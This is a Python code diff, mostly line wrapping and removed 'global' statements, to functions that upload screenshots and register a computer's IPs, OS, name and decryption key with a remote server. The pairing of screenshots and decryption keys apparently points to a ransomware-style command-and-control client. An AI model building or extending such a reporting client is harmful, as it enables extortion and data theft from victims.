@@ -22,8 +22,6 @@ def post_image(image_path: str, computer_id: int):
     :param computer_id: the ID of the current computer in the server database
     """
 
-    global SERVER_SCREENSHOT_URL
-
     payload = {'computer': computer_id}
     __, file_name = split(image_path)
 
@@ -33,12 +31,21 @@ def post_image(image_path: str, computer_id: int):
         ]
         headers = {
             'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
-                                                          os.getenv("API_ADMIN_PASSWORD")).encode()).decode(),
+                                                          os.getenv("API_ADMIN_PASSWORD"))
+                                                         .encode()).decode(),
         }
-        print(requests.request("POST", SERVER_SCREENSHOT_URL, headers=headers, data=payload, files=files).text)
+        print(requests.request("POST",
+                               SERVER_SCREENSHOT_URL,
+                               headers=headers,
+                               data=payload,
+                               files=files).text)
 
 
-def create_computer(public_ip: str, private_ip: str, computer_os: str, computer_name: str, decryption_key: str):
+def create_computer(public_ip: str,
+                    private_ip: str,
+                    computer_os: str,
+                    computer_name: str,
+                    decryption_key: str):
     """
     This function is used create a new computer on the database of the web server
     1) Prepare the payload with all the information in param
@@ -50,7 +57,6 @@ def create_computer(public_ip: str, private_ip: str, computer_os: str, computer_
     :param private_ip: Private IP of the computer
     :param public_ip: Public IP of the computer
     """
-    global SERVER_COMPUTER_URL
 
     payload = json.dumps({
         "private_ip": private_ip,
@@ -64,7 +70,8 @@ def create_computer(public_ip: str, private_ip: str, computer_os: str, computer_
 
     headers = {
         'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
-                                                      os.getenv("API_ADMIN_PASSWORD")).encode()).decode(),
+                                                      os.getenv("API_ADMIN_PASSWORD"))
+                                                     .encode()).decode(),
         'Content-Type': 'application/json'
     }
 
